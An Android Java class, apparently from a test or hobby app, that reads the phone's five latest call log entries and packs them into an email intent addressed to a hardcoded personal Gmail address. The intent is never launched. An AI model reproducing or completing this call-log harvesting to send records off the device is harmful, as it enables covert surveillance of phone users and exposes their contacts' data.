package com.notify.notify;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.support.v4.app.ActivityCompat;

import java.util.Date;

/**
 * Created by Himanjan on 11-03-2017.
 */

public class CollectCallLogs {
    public void getCallDetails(Context context) {
        StringBuffer sb = new StringBuffer();
        context = MyApplication.getAppContext();

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        Cursor managedCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

        sb.append("Call Details: ");
        int count = 0;

        while (managedCursor.moveToNext() && count < 5) {
            count++;
            String phoneNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date timeOfCall = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);

            String directory = null;

            int directoryCode = Integer.parseInt(callType);

            switch (directoryCode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    directory = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    directory = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    directory = "MISSED";
                    break;
            }

            sb.append("\nPhone Number:--- " + phoneNumber + " \nCall Type:--- " + directory + " \nCall Date:--- " + timeOfCall + " \nCall duration in sec :--- " + callDuration);
            sb.append("\n----------------------------------");
        }

        managedCursor.close();
        sendEmail(sb.toString());
    }

    private void sendEmail(String email) {
        Intent emailIntent = new Intent(Intent.ACTION_SEND);
        emailIntent.setType("message/rfc822");
        emailIntent.putExtra(Intent.EXTRA_EMAIL, new String[]{"priyotama.singh12@gmail.com"});
        emailIntent.putExtra(Intent.EXTRA_SUBJECT, "Testing for app");
        emailIntent.putExtra(Intent.EXTRA_TEXT, email);
    }
}
